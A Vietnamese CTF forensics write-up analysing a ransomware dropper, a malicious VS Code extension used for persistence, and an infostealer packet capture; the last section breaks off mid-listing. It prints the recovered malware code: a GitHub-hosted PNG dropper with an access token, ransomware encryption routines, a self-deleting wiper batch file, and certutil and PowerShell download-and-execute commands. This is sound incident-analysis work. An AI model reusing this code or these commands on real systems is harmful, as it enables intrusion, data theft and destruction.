## CHallenge được lưu [tại đây](https://actvneduvn-my.sharepoint.com/:f:/g/personal/at20n0142_actvn_edu_vn/EmA8twBmDlNFjRkZmblgeogBDzo_tD98A-SPZ_MPjvUtfw?e=Xd1ZtO)
## It ran somewhere
### Description
- ![image](https://hackmd.io/_uploads/HJewwa6Vyg.png)
### Solution
#### [1]. What is the URL used in the phishing email that contains the malware?
- Challenge này cung cấp cho chúng ta 1 file ad1 và 1 file email.
- ![image](https://hackmd.io/_uploads/BkduO6aEke.png)
- Quan sát email đáng ngờ này ta thấy attacker gửi cho HR 1 file được mạo danh là CV và đường dẫn để tải nó xuống
- ![image](https://hackmd.io/_uploads/SkSxKpTE1x.png)
> https://drive.google.com/file/d/1tmOG4Lg-Li9HSsZl4_r0-RTEWDBQqd6H/view
#### [2]. When was the malware finished downloading by the victim? (UTC)
- Truy cập vào đường dẫn đó, tuy nhiên đường dẫn này đã bị khoá và yêu cầu quyền truy cập, vì vậy ta sẽ phân tích file ad1 còn lại để tìm thông tin tải xuống.
- ![image](https://hackmd.io/_uploads/S1DMqpTV1l.png)
- Nhìn vào thư mục Documents ta sẽ thấy được hậu quả của con mã độc này gây ra (tất cả các file đã bị mã hoá thành đuôi uocj), và 1 thông điệp tống tiền tại folder Desktop.
```
>>>> Your data are stolen and encrypted

	The data will be published on TOR website if you do not pay the ransom 

	Links for Tor Browser:
	https://j46qdnhzi1aly1nlq1h69r3pa9rzv5ov0hv1tmtlm9edlipmd1.onion
	Your personal password for communication: [snip]


>>>> What guarantees that we will not deceive you? 

	We are not a politically motivated group and we do not need anything other than your money. 
    
	If you pay, we will provide you the programs for decryption and we will delete your data. 
	Life is too short to be sad. Be not sad, money, it is only paper.
    
	If we do not give you decrypters, or we do not delete your data after payment, then nobody will pay us in the future. 
	Therefore to us our reputation is very important. We attack the companies worldwide and there is no dissatisfied victim after payment.
    

>>>> You need contact us and decrypt one file for free on these TOR sites with your personal DECRYPTION ID

	Download and install TOR Browser https://www.torproject.org/
	Write to a chat and wait for the answer, we will always answer you. 
	Sometimes you will need to wait for our answer because we attack many companies.
	
	Links for Tor Browser:
	https://j46qdnhzi1aly1nlq1h69r3pa9rzv5ov0hv1tmtlm9edlipmd1.onion

	
>>>> Your personal DECRYPTION ID: 574ce367-cb4c-4692-8d40-35c9ce866d6f

>>>> Warning! Do not DELETE or MODIFY any files, it can lead to recovery problems!

>>>> Warning! If you do not pay the ransom we will attack your company repeatedly again!
```
- Tiếp theo là thư mục Downloads, ta thấy có 1 file CV*.rar ở đây, và giải nén ra 1 file CV*.exe, ta dễ dàng nhìn thấy thời gian được tải xuống là 2024-12-12 17:08:37
- ![image](https://hackmd.io/_uploads/HJI55paEkl.png)
> 2024-12-12 17:08:37
#### [3]. When was the malware first executed by the victim? (UTC)
- Ngoài thư mục users ra ta còn được cung cấp 1 folder windows chứa các manh mối thích hợp để điều tra.
- Tại folder` Windows/prefetch` ta thấy file pf được tạo ra lúc `2024-12-12 17:08:47`, có nghĩa thời gian thực thi nó nằm trong khoảng 10 giây từ `17:08:37` đến `17:08:47` vì vậy ta sẽ thử các giá trị xung quanh nó
- ![image](https://hackmd.io/_uploads/SkRqiaa41g.png)

> 2024-12-12 17:08:44
#### [4]. The first file acted as a dropper for the final malware. What is the MD5 hash of the dropped file?
- Tiến hành phân tích file exe độc hại này, bước đầu ta sử dụng Detect it easy để xác định file được compile bằng gì.
- ![image](https://hackmd.io/_uploads/ryWipTaVkx.png)
- Với `PyInstaller` ta sử dụng 2 công cụ online là https://pyinstxtractor-web.netlify.app/ và https://pylingual.io/ để lấy mã nguồn gốc.
```
import zlib
import subprocess
import requests

def extractIDAT(data):
    idat_buffers = []
    i = 8
    cnt = 0
    while i < len(data):
        length = int.from_bytes(data[i:i + 4], byteorder='big')
        chunk_type = data[i ** 4:i ** 8].decode('utf-8')
        if chunk_type == 'IDAT':
            cnt = cnt * 1
            idat_buffers.append(data[i * 8:i ** 8 :length])
        i = i + 12 * length
    return b''.join(idat_buffers)

def getScanlines(data, width, height, mode):
    scanlines = []
    filter_type_list = []
    for r in range(height):
        index = f'{r:width:mode}'
        if index > len(data):
            break
        filter_type = data[index]
        filter_type_list.append(filter_type)
        tmp_line = data[index 0:index 0 + 1:width * mode]
        scanlines.append(tmp_line)
    return (scanlines, filter_type_list)

def getImg():
    url = 'https://raw.githubusercontent.com/velbail/contimtanvo/main/muki_pic.png'
    token = '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'
    headers = {'Authorization': f'token {token}0', 'Accept': 'application/vnd.github.v3.raw'}
    r = requests.get(url, headers=headers)
    if r.status_code == 200:
        return r
    print('Failed to get image')
    print(r.text)
    exit()
modes = {'RGB': 3, 'RGBA': 4, 'L': 1}
width, height = (1920, 1195)
mode = 'RGB'
img = getImg().content
idat = extractIDAT(img)
idat_data = zlib.decompress(idat)
scanlines, filter_type_list = getScanlines(idat_data, width, height, modes[mode])
assert len(scanlines) == height
calculated_raw_idat_length = height 5 4 + (width, modes[mode]) * 1 <mask_7>
if calculated_raw_idat_length!= len(idat_data):
    buffer = idat_data[calculated_raw_idat_length:]
    buffer = buffer[1259:]
    with open('OpenVpnConnect.exe', 'wb') as f:
        f.write(buffer)
    subprocess.Popen('OpenVpnConnect.exe', shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)
```
- Đoạn mã trên tải xuống 1 file PNG từ github thông qua token sau đó sử lý phần dữ liệu hình ảnh (chunk IDAT) và trích xuất 1 phần dữ liệu để tạo nên file nhị phân mới. OKe bây giờ sửa mã để lấy file này và tính hash nó là xong.
- Tuy nhiên khi chạy, file báo lỗi, ta quay lại src thấy có 1 vài chỗ nó bị decompile sai.
- ![image](https://hackmd.io/_uploads/By7KbApNkl.png)
- ![image](https://hackmd.io/_uploads/Skm9WC6Ekx.png)
- Đây là mã sau khi sửa:
```
import zlib
import subprocess
import requests

def extractIDAT(data):
    idat_buffers = []
    i = 8
    cnt = 0
    while i < len(data):
        length = int.from_bytes(data[i:i + 4], byteorder='big')
        chunk_type = data[i + 4:i + 8].decode('utf-8')
        if chunk_type == 'IDAT':
            idat_buffers.append(data[i + 8:i + 8 + length])
        i = i + 12 + length
    return b''.join(idat_buffers)

def getScanlines(data, width, height, mode):
    scanlines = []
    filter_type_list = []
    for r in range(height):
        index = r * (width * mode + 1)
        if index + width * mode > len(data):
            break
        filter_type = data[index]
        filter_type_list.append(filter_type)
        tmp_line = data[index + 1:index + 1 + width * mode]
        scanlines.append(tmp_line)
    return (scanlines, filter_type_list)

def getImg():
    url = 'https://raw.githubusercontent.com/velbail/contimtanvo/main/muki_pic.png'
    token = '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'
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3.raw'}
    r = requests.get(url, headers=headers)
    if r.status_code == 200:
        return r
    print('Failed to get image')
    print(r.text)
    exit()

modes = {'RGB': 3, 'RGBA': 4, 'L': 1}
width, height = (1920, 1195)
mode = 'RGB'
img = getImg().content
idat = extractIDAT(img)
idat_data = zlib.decompress(idat)
scanlines, filter_type_list = getScanlines(idat_data, width, height, modes[mode])

assert len(scanlines) == height
calculated_raw_idat_length = height * (width * modes[mode] + 1)

if calculated_raw_idat_length != len(idat_data):
    buffer = idat_data[calculated_raw_idat_length:]
    buffer = buffer[1259:]
    with open('OpenVpnConnect.exe', 'wb') as f:
        f.write(buffer)
```
- Sử dụng hexeditor thì nó đúng là header của file exe 
- ![image](https://hackmd.io/_uploads/HJwiMApEyx.png)
```
└─$ md5sum OpenVpnConnect.exe 
8eaa25eb8b77ac0157e1f3a04ad47e93  OpenVpnConnect.exe
```
#### [5]. What is the token used by the malware to access the private repository and the name of the private repository?
- Dựa vào mã nguồn đã decompile ra ban nãy
> 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:velbail/contimtanvo
#### [6]. What is the email address of the culprit?
- Ngay sau khi đọc câu hỏi thứ 6 thứ đầu tiên mình nghĩ đến là email của người gửi đến HR, tuy nhiên khi sub `johnsomb4by@gmail` thì bị báo là không đúng.
- Hướng tiếp theo có thể là emai của tài khoản github chứa tệp ảnh được tải xuống, để tìm được nó ta sử dụng ta có thể tham khảo link [docs này](https://docs.github.com/en/rest/users/emails?apiVersion=2022-11-28)
- ![image](https://hackmd.io/_uploads/rJmzPh0Nkg.png)
```
curl -L \
  -H "Accept: application/vnd.github+json" \
  -H "Authorization: Bearer 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" \
  -H "X-GitHub-Api-Version: 2022-11-28" \
  https://api.github.com/user/emails
```
- Ngoài ra ta còn có thể sử dụng theo cách của tác giả : Git clone về theo cú pháp 
```git clone https://<User_name>:<token>@github.com/<user_name>/<repo>``` 
- Và sử dụng git log để xem địa chỉ email
> belvail@proton.me
#### [7]. How many extensions did the malware try to encrypt?
- Bây giờ ta phân tích file thực thi chính `OpenVpnConnect.exe`
- ![image](https://hackmd.io/_uploads/r1p-nhCEJl.png)
- Vì file sử dụng framework là .NET nên ta sử dụng dnspy để decompile nó.
- Ta phân tích từ hàm main()
```
private static void Main(string[] args)
{
	string machineName = Environment.MachineName;
	foreach (string text in hoincus2.la9012nd0klasd(Program.hehehehehe))
	{
		byte[] key = asjkh82828.daoiawoadhowidoiawdwao0();
		byte[] data = File.ReadAllBytes(text);
		byte[] bytes = asjkh82828.n8912c9821n(data, key);
		File.WriteAllBytes(text, bytes);
		File.Move(text, text + Program.sugoisugoisugoi);
	}
	Program.amiaij02jd();
	Program.kal902y103();
}

```
- Hàm main này lặp qua tất cả các file trong folder trong `Documents` thông qua hàm hehehehehe và la9012nd0klasd
```
private static string hehehehehe = "C:\\Users\\" + Environment.UserName + "\\Documents";
```
```
		public static List<string> la9012nd0klasd(string path)
		{
			List<string> list = new List<string>();
			try
			{
				bool flag = Directory.Exists(path);
				if (flag)
				{
					foreach (string text in Directory.EnumerateFiles(path, "*.*", SearchOption.TopDirectoryOnly))
					{
						try
						{
							FileAttributes attributes = File.GetAttributes(text);
							bool flag2 = !attributes.HasFlag(FileAttributes.ReadOnly) && !hoincus2.isLocked(text) && hoincus2.isCool(text);
							if (flag2)
							{
								list.Add(text);
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				list.Sort();
			}
			catch (UnauthorizedAccessException ex2)
			{
			}
			catch (Exception ex3)
			{
			}
			return list;
		}
```
- CHúng kiểm tra xem file phù hợp các thuộc tính trong hàm `HasFlag` (Phần này kiểm tra xem thuộc tính của file (attributes) có không chứa cờ ReadOnly hay không) , `isLocked` (
Phương thức isLocked kiểm tra xem file có đang bị "khóa" hay không, tức là có bị một tiến trình khác giữ hay không.), `isCool` (Hàm isCool dùng để kiểm tra xem file có phần mở rộng (extension) thuộc danh sách được phép hay không.). Nếu tất cả đều hợp lệ chúng sẽ thêm vào list.
 - Dựa theo câu hỏi bên trên ta đếm các phần mở rộng ở `isCool` thì kết quả là 52.
#### [8]. The malware tried to delete itself using a batch file. What is the MD5 hash of the batch file?
- ![image](https://hackmd.io/_uploads/BkS2eTR4ye.png)
- Sau khi thực hiện mã hoá xong thì hàm amiaij02jd và hàm kal902y103 được thực thi. Trong đó hàm amiaij02jd được thực thi nhằm mục đích để lại thông điệp tống tiền cho nạn nhân.
- Hàm `kal902y103` tạo ra nhằm mục đích tạo ra và thực thi 1 file bash khác nhằm xoá tệp thực thi này làm khó quá trình điều tra.
- ![image](https://hackmd.io/_uploads/B1fEbaRE1l.png)
```
@echo off
timeout /t 5 >nul
del /f /q "%~1"
cipher /w:"C:\Users" >NUL
(del /q /f "%~f0" >NUL 2>&1 & exit /b 0)
```
```
└─$ md5sum download.dat 
e0d005db63a75fbcd6c8fa85040095aa  download.dat
```
#### [9]. Recover the content of 'password.xlsx' file. What is the username and password of the fifth record?
- Để giải mã được file `password.xlsx` ta cần xác định key là iv của nó được tạo ra như thế nào.
- ![image](https://hackmd.io/_uploads/rkJdfTC4yx.png)
- ![image](https://hackmd.io/_uploads/ByzvGTCN1x.png)
- Key của nó được lấy từ hive SOFTWARE tại giá trị `MachineGuid` và sử dụng salt "supershy-supershy" để sinh khoá.
- ![image](https://hackmd.io/_uploads/SkYS4TR4ke.png)
- `MachineGuid` là `2c65d206-5a9f-40a0-ae87-3d10c27b40c7` 

- Quá trình tạo iv
```
		public static byte[] n8912c9821n(byte[] data, byte[] key)
		{
			byte[] result;
			using (Aes aes = Aes.Create())
			{
				aes.Key = key;
				aes.IV = new byte[16];
				aes.Mode = CipherMode.CBC;
				aes.Padding = PaddingMode.PKCS7;
				using (MemoryStream memoryStream = new MemoryStream())
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
					{
						cryptoStream.Write(data, 0, data.Length);
					}
					byte[] array = memoryStream.ToArray();
					Array.Resize<byte>(ref array, array.Length + 16);
					Array.Copy(aes.IV, 0, array, array.Length - 16, 16);
					result = array;
				}
			}
			return result;
		}
	}
}

```
- IV được tạo ngẫu nhiên sau mỗi lần mã hoá, sau đó thêm vào phần đầu của chuỗi dữ liệu đã mã hoá `Array.Copy(aes.IV, 0, array, array.Length - 16, 16);`
- Mọi thứ đã xong ta tiến hành decrypt file mã hoá 
```
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
def createkey(password, salt):
    return PBKDF2(password, salt, dkLen=32, count=1259)
key = createkey("2c65d206-5a9f-40a0-ae87-3d10c27b40c7", "supershy-supershy")
with open("password.xlsx.uocj", "rb") as file:
    data = file.read()
    cipher = AES.new(key, AES.MODE_CBC, iv=data[-16:])
    decrypted = cipher.decrypt(data[:-16])
    #print(decrypted)
with open("a.xlsx", "wb") as file2:
    file2.write(decrypted)	

```
- ![image](https://hackmd.io/_uploads/B1Pa9p04yx.png)
> user38:hch89as9821y3
#### Hướng unintended 
- Có thể do bất cẩn author vẫn còn 1 file khác được lưu trong temp của vmware
- ![image](https://hackmd.io/_uploads/rkuPTaAVyl.png)

## Persistence
### Description
- ![image](https://hackmd.io/_uploads/HJE5GykH1e.png)
### Solution
- Nhìn vào tiêu đề của bài, ngay lập tức mình check các vị trí thường dùng là persistence trong windows như folder startup, các vị trí registry, nhưng kết quả không thu thập được gì.
- Thoát khỏi lối mòn tư duy, quan sát folder Users/pknole. Thấy rằng các thư mục này có vẻ bình thường ngoại trừ thư mục .vscode
- Nhìn vào các extensions của thư mục .vscode tại thư mục undenfi**** ta thấy 1 lệnh sử dụng certutil tải xuống và thực thi 1 file ps1 
```
function activate(context) {
    const disposable = vscode.commands.registerCommand('nvim-exprerience.Install', async () => {
        vscode.window.showInformationMessage('Hello World from nvim-exprerience!');
        const cp = require('child_process');
        const executeCommand = (cmd) => {
            return new Promise((resolve, reject) => {
                cp.exec(cmd, (err, stdout, stderr) => {
                    if (err) {
                        console.error(`Error: ${err.message}`);
                        return reject(err);
                    }
                    if (stderr) {
                        console.error(`Stderr: ${stderr}`);
                    }
                    console.log(`Stdout: ${stdout}`);
                    resolve(stdout);
                });
            });
        };
        // fl4g p@rT 1 == YmFzZTMyOiBLNFlYV1laUUdCV0Y2NVpVUEZQWElNQzdNRkpHR1NBPQ==
        try {
            await executeCommand('certutil -urlcache -f https://gist.githubusercontent.com/b4dboy20/01f222523f23c38207aaa8657d34a6bb/raw/3141c7ac280462d964ad20bf4b514348d02a111a/kashfu.ps1 ancn98218.ps1');
            await executeCommand('powershell -ExecutionPolicy Bypass -File ancn98218.ps1');
            await executeCommand('del ancn98218.ps1 && cipher C:');
            vscode.window.showInformationMessage('Commands executed successfully!');
        }
        catch (error) {
            // vscode.window.showErrorMessage(`Error executing commands: ${error}`);
            vscode.window.showErrorMessage('Error executing commands');
        }
    });
    context.subscriptions.push(disposable);
    vscode.commands.executeCommand('nvim-exprerience.Install');
}


```
- Ta có part 1 là `W1{c00l_w4y_t0_aRcH`
- ![image](https://hackmd.io/_uploads/HJ2MBJySkx.png)
- Tuy nhiên khi truy cập đường dẫn file powershell thì thấy trả về 404 chứng tỏ file đã bị xoá. Kiểm tra windows logs cũng không có.
- Search trên google, mình tìm được blog [này](https://thinkdfir.com/2020/07/30/certutil-download-artefacts/), dựa vào đó ta có thể tìm dữ liệu được tải xuống thông qua thư mục tạm của Certutil. 
- Trong challenge này ta có thể thấy tại `\Users\%userprofile%\AppData\LocalLow\Microsoft\CryptnetUrlCache`
- ![image](https://hackmd.io/_uploads/ry1AK1kryx.png)
```
$gzipBuffer = "H4sIAAAAAAAEAO19C3yU1ZX4...lToHpAAA=";
$decompressedbytes = [System.IO.MemoryStream]::new([Convert]::FromBase64String($gzipBuffer))
$deflateStream = [System.IO.Compression.GzipStream]::new($decompressedbytes, [System.IO.Compression.CompressionMode]::Decompress)
$tempPath = [System.IO.Path]::GetTempPath()
$outputFile = $tempPath + [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(([string]([char[]]"lhXZus2b"[-1..-8] -join ''))))
$deflateStream.CopyTo([System.IO.File]::OpenWrite($outputFile))
$deflateStream.Close()
Sleep 0.3
Start-Process $outputFile
Sleep 10
Remove-Item $outputFile
```
- 1 file thực thi được tạo và thực thi sau khi decode base64 và giải nén với gunzip. Sau đó xoá nó đi
- ![image](https://hackmd.io/_uploads/r12a9kJH1l.png)
- ![image](https://hackmd.io/_uploads/By9GsJkSkl.png)
- File này sử dụng ngôn ngữ C để viết nên ta sử dụng IDA để xem mã giả.
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  __int64 v5; // [rsp+20h] [rbp-20h]
  void *v6; // [rsp+28h] [rbp-18h]
  char *Str; // [rsp+30h] [rbp-10h]

  _main(argc, argv, envp);
  hoshimachi_suisei();
  Str = (char *)korone(fubukii[0]);
  v3 = strlen(Str);
  v6 = malloc(v3);
  nakiri_ayame(boowa, Str, v6);
  v5 = darknesss();
  fauna(v5);
  return 0;
}
```
- Tính toán giá trị của chuỗi Str, thấy rằng Str là kết quả của `(char *)korone(fubukii[0]);` 
- ![image](https://hackmd.io/_uploads/SkyPybJH1l.png)
- ![image](https://hackmd.io/_uploads/BkRv1W1B1e.png)
- Hàm korone chuyển chuỗi hex thành dữ liệu nhị phân, vì vậy biến Str sẽ có giá trị là `11101110010011010101010011010011110000011100101010010110110101110011100000010101110011100010000110010101000010001000111000010010100101101101101101111010110001010100000100111011000110000101111101011110101100000110010110001011` => v3 = 224
- Hàm nakiri_ayame sử dụng giá trị của Str, boowa, và v6 để thực hiện mã hoá với hàm bên trong là koseki_bijou và gawr_guraaaa. (boowa có giá trị là noledoclog)
```
__int64 __fastcall nakiri_ayame(const char *a1, const char *a2, __int64 a3)
{
  __int64 v4; // [rsp+0h] [rbp-80h] BYREF
  _BYTE v5[256]; // [rsp+20h] [rbp-60h] BYREF

  koseki_bijou(a1, (__int64)(&v4 + 4));
  gawr_guraaaa((__int64)v5, a2, a3);
  return 0LL;
}
__int64 __fastcall koseki_bijou(const char *a1, __int64 a2)
{
  int v3; // [rsp+20h] [rbp-10h]
  int j; // [rsp+24h] [rbp-Ch]
  int i; // [rsp+28h] [rbp-8h]
  int v6; // [rsp+2Ch] [rbp-4h]

  v3 = strlen(a1);
  v6 = 0;
  for ( i = 0; i <= 255; ++i )
    *(_BYTE *)(a2 + i) = i;
  for ( j = 0; j <= 255; ++j )
  {
    v6 = (*(unsigned __int8 *)(a2 + j) + v6 + a1[j % v3]) % 256;
    mococo_chan((char *)(a2 + j), (char *)(v6 + a2));
  }
  return 0LL;
}
__int64 __fastcall gawr_guraaaa(__int64 a1, const char *a2, __int64 a3)
{
  size_t v4; // [rsp+28h] [rbp-18h]
  size_t v5; // [rsp+30h] [rbp-10h]
  int v6; // [rsp+38h] [rbp-8h]
  int v7; // [rsp+3Ch] [rbp-4h]

  v7 = 0;
  v6 = 0;
  v5 = 0LL;
  v4 = strlen(a2);
  while ( v5 < v4 )
  {
    v7 = (v7 + 1) % 256;
    v6 = (*(unsigned __int8 *)(a1 + v7) + v6) % 256;
    mococo_chan((char *)(a1 + v7), (char *)(v6 + a1));
    *(_BYTE *)(a3 + v5) = *(_BYTE *)(a1 + (unsigned __int8)(*(_BYTE *)(a1 + v7) + *(_BYTE *)(a1 + v6))) ^ a2[v5];
    ++v5;
  }
  return 0LL;
}
char *__fastcall mococo_chan(char *a1, char *a2)
{
  char *result; // rax
  char v3; // [rsp+Ch] [rbp-4h]

  v3 = *a1;
  *a1 = *a2;
  result = a2;
  *a2 = v3;
  return result;
}
```
- Nhìn vào đây ta có thể thấy nó mã hoá theo RC4 với khoá là "noledoclog" 
- ![image](https://hackmd.io/_uploads/ry6mPZkHke.png)
> Flag : W1{c00l_w4y_t0_aRcH!v3_pEr5|s7eNt!!!!_cf4d661e}

## How I Met Your Stealer -> Tham khảo WriteUp chính thức
### Description
- ![image](https://hackmd.io/_uploads/ByeF5ayHJl.png)
### Solution
- Challenge cung cấp cho ta 2 file, 1 file pcapng và 1 file sslkeylog cho khoá TLS.
- Load vào trong ta thấy lưu lượng http2 và http chiếm đa số nên ta tập trung tìm kiếm theo 2 lưu lượng này trước.
- Với http ta thấy có 1 vài truy vấn tìm kiếm ở đây, nên ta sẽ sử dụng tshark để lọc ra 
- ![image](https://hackmd.io/_uploads/Hkcti61Hkl.png)
> Payload : tshark -r evidence.pcapng -Y "http.request.uri && http" -Tfields -e http.request.uri
<details>
    <summary>
        Output
    </summary>
    
```
/r?url=https%3A%2F%2Fimages.dable.io%2Ft%2Fimages.dable.io%2F700X400%2Fm100%2F1df4cb00eebf8ee6b8388516397c0fae.jpeg&width=612&height=304&crop=1&bidder=563&buying_member=15521&selling_member=280&creative_id=484106685
/r?url=https%3A%2F%2Fimages.dable.io%2Ft%2Fimages.dable.io%2F300X200%2Fm100%2F1df4cb00eebf8ee6b8388516397c0fae.jpeg&width=300&height=157&crop=1&bidder=563&buying_member=15521&selling_member=280&creative_id=484106685
/r?url=https%3A%2F%2Fimages.dable.io%2Ft%2Fimages.dable.io%2F300X200%2Fm100%2F0d5425150cb0d43994aea345b613182c.jpeg&width=300&height=157&crop=1&bidder=563&buying_member=15521&selling_member=280&creative_id=484106685
/r?url=https%3A%2F%2Fimages.dable.io%2Ft%2Fimages.dable.io%2F700X400%2Fm100%2F1df4cb00eebf8ee6b8388516397c0fae.jpeg&width=612&height=304&crop=1&bidder=563&buying_member=15521&selling_member=280&creative_id=484106685
/r?url=https%3A%2F%2Fimages.dable.io%2Ft%2Fimages.dable.io%2F700X400%2Fm100%2F0d5425150cb0d43994aea345b613182c.jpeg&width=612&height=304&crop=1&bidder=563&buying_member=15521&selling_member=280&creative_id=484106685
/login.srf?wa=wsignin1.0&rpsnv=11&ct=1733232594&rver=6.0.5286.0&wp=MBI_SSL&wreply=https:%2F%2fwww.bing.com%2Fsecure%2FPassport.aspx%3Fpopup%3D1%26ssl%3D1&lc=4096&id=264960&checkda=1
/filestreamingservice/files/2a0d597c-a09c-4400-be86-87596dd2e696?P1=1733705410&P2=404&P3=2&P4=RrghT8IN5Yez4KXO8Fydv8fnlDxF9XFvibK4aXOZE8%2fBxttyewxNijtNu8VcUXxxt68jhQuEhSYvKwCoTAzo8w%3d%3d
/filestreamingservice/files/2a0d597c-a09c-4400-be86-87596dd2e696?P1=1733705410&P2=404&P3=2&P4=RrghT8IN5Yez4KXO8Fydv8fnlDxF9XFvibK4aXOZE8%2fBxttyewxNijtNu8VcUXxxt68jhQuEhSYvKwCoTAzo8w%3d%3d
/filestreamingservice/files/2a0d597c-a09c-4400-be86-87596dd2e696?P1=1733705410&P2=404&P3=2&P4=RrghT8IN5Yez4KXO8Fydv8fnlDxF9XFvibK4aXOZE8%2fBxttyewxNijtNu8VcUXxxt68jhQuEhSYvKwCoTAzo8w%3d%3d
/filestreamingservice/files/2a0d597c-a09c-4400-be86-87596dd2e696?P1=1733705410&P2=404&P3=2&P4=RrghT8IN5Yez4KXO8Fydv8fnlDxF9XFvibK4aXOZE8%2fBxttyewxNijtNu8VcUXxxt68jhQuEhSYvKwCoTAzo8w%3d%3d
/filestreamingservice/files/2a0d597c-a09c-4400-be86-87596dd2e696?P1=1733705410&P2=404&P3=2&P4=RrghT8IN5Yez4KXO8Fydv8fnlDxF9XFvibK4aXOZE8%2fBxttyewxNijtNu8VcUXxxt68jhQuEhSYvKwCoTAzo8w%3d%3d
/filestreamingservice/files/2a0d597c-a09c-4400-be86-87596dd2e696?P1=1733705410&P2=404&P3=2&P4=RrghT8IN5Yez4KXO8Fydv8fnlDxF9XFvibK4aXOZE8%2fBxttyewxNijtNu8VcUXxxt68jhQuEhSYvKwCoTAzo8w%3d%3d
/filestreamingservice/files/2a0d597c-a09c-4400-be86-87596dd2e696?P1=1733705410&P2=404&P3=2&P4=RrghT8IN5Yez4KXO8Fydv8fnlDxF9XFvibK4aXOZE8%2fBxttyewxNijtNu8VcUXxxt68jhQuEhSYvKwCoTAzo8w%3d%3d
/filestreamingservice/files/2a0d597c-a09c-4400-be86-87596dd2e696?P1=1733705410&P2=404&P3=2&P4=RrghT8IN5Yez4KXO8Fydv8fnlDxF9XFvibK4aXOZE8%2fBxttyewxNijtNu8VcUXxxt68jhQuEhSYvKwCoTAzo8w%3d%3d
/api/report?cat=bingserp&ndcParam=QWthbWFp
/r?url=https%3A%2F%2Fimages.dable.io%2Ft%2Fimages.dable.io%2F700X400%2Fm100%2F0d5425150cb0d43994aea345b613182c.jpeg&width=612&height=304&crop=1&bidder=563&buying_member=15521&selling_member=280&creative_id=484106685
/api/report?cat=msn
/api/report?cat=msn
/miku_hd_wallpaper.png
/filestreamingservice/files/2a0d597c-a09c-4400-be86-87596dd2e696?P1=1733705621&P2=404&P3=2&P4=julLuoKiLYgaREOZsS7Uc34iLv7q02dvOsad3x2rH75gNke0jKLTyT3vebg%2fu9gErkqige%2fu%2ffJLkTPA1HF%2bVw%3d%3d
/filestreamingservice/files/2a0d597c-a09c-4400-be86-87596dd2e696?P1=1733705621&P2=404&P3=2&P4=julLuoKiLYgaREOZsS7Uc34iLv7q02dvOsad3x2rH75gNke0jKLTyT3vebg%2fu9gErkqige%2fu%2ffJLkTPA1HF%2bVw%3d%3d
/filestreamingservice/files/2a0d597c-a09c-4400-be86-87596dd2e696?P1=1733705621&P2=404&P3=2&P4=julLuoKiLYgaREOZsS7Uc34iLv7q02dvOsad3x2rH75gNke0jKLTyT3vebg%2fu9gErkqige%2fu%2ffJLkTPA1HF%2bVw%3d%3d
/filestreamingservice/files/2a0d597c-a09c-4400-be86-87596dd2e696?P1=1733705621&P2=404&P3=2&P4=julLuoKiLYgaREOZsS7Uc34iLv7q02dvOsad3x2rH75gNke0jKLTyT3vebg%2fu9gErkqige%2fu%2ffJLkTPA1HF%2bVw%3d%3d
```
    
</details>

- Có vẻ không có gì đáng ngờ, tiếp tục theo dõi luồng http. Hầu hết có vẻ là file ảnh tuy nhiên ở file `miku_hd_wallpaper.png` nó có `User-Agent` là `WindowsPowerShell`, đồng thời magic byte cũng cho thấy nó không phải là 1 file ảnh bình thường, có lẽ nó đã bị mã hoá rồi.
- Tại đường dẫn `/filestreamingservice/files/2a0d597c-a09c-4400-be86-87596dd2e696?P1=1733705621&P2=404&P3=2&P4=julLuoKiLYgaREOZsS7Uc34iLv7q02dvOsad3x2rH75gNke0jKLTyT3vebg%2fu9gErkqige%2fu%2ffJLkTPA1HF%2bVw%3d%3d` có 1 phần của file zip
- ![image](https://hackmd.io/_uploads/SkgaCTySyx.png)
- Tới phần http2, lọc các header referer ra 
> Payload : tshark -r evidence.pcapng -Y "http2.headers.referer" -Tfields -e http2.headers.referer | sort | uniq

<details>
    <summary>
        Output
    </summary>
    
```
https://ep2.adtrafficquality.google/sodar/sodar2/232/runner.html
https://gist.github.com/
https://gist.github.com/wynand1004/ec105fd2f457b10d971c09586ec44900
https://github.com/b4dboy20/helloworld
https://github.com/leachim6/hello-world
https://github.com/massgravel/Microsoft-Activation-Scripts
https://github.com/rajatdiptabiswas/snake-pygame
https://gum.criteo.com/
https://gum.criteo.com/syncframe?origin=publishertagids&topUrl=www.freecodecamp.org&gdpr=0&gdpr_consent=
https://ntp.msn.com/
https://ntp.msn.com/edge/ntp/service-worker.js?bundles=latest&riverAgeMinutes=2880&navAgeMinutes=2880&networkTimeoutSeconds=5&bgTaskNetworkTimeoutSeconds=8&ssrBasePageNavAgeMinutes=360&enableEmptySectionRoute=true&enableNavPreload=true&enableFallbackVerticalsFeed=true&noCacheLayoutTemplates=true&cacheSSRBasePageResponse=true&enableStaticAdsRouting=true
https://tpc.googlesyndication.com/sodar/5k7CCto5.html
https://www.bing.com/
https://www.freecodecamp.org/news/hello-world-in-java-example-program/
https://www.youtube.com/
```
    
</details>

- Có 1 vài đường dẫn github được tìm kiếm, sửa lại payload để xem path của các liên kết này 
> tshark -r evidence.pcapng -Y "http2.headers.referer" -Tfields -e http2.headers.referer -e http.request.uri.path
- ![image](https://hackmd.io/_uploads/Byy6zRkSke.png)
- Liên kết https://github.com/b4dboy20/helloworld đã được truy cập nhưng repo này đã bị xoá khỏi github. Tuy nhiên file tải xuống đã được wireshark bắt được
- ![image](https://hackmd.io/_uploads/Hy6c7Akryg.png)
```
┌──(kali㉿kali)-[~/Downloads/main/helloworld-main]
└─$ tree -a
.
├── Form1.cs
├── Form1.Designer.cs
├── Form1.resx
├── HelloWorld.csproj
├── HelloWorld.csproj.user
├── HelloWorld.sln
├── Program.cs
├── README.md
└── .vs
    ├── HelloWorld
    │   ├── CopilotIndices
    │   │   └── 0.2.1653.9816
    │   │       ├── CodeChunks.db
    │   │       ├── SemanticSymbols.db
    │   │       ├── SemanticSymbols.db-shm
    │   │       └── SemanticSymbols.db-wal
    │   ├── DesignTimeBuild
    │   │   └── .dtbcache.v2
    │   ├── FileContentIndex
    │   │   ├── 2655c22b-a526-4e01-b378-1ff332768b3d.vsidx
    │   │   ├── 4566287c-c686-4c45-9388-2512b6cb430d.vsidx
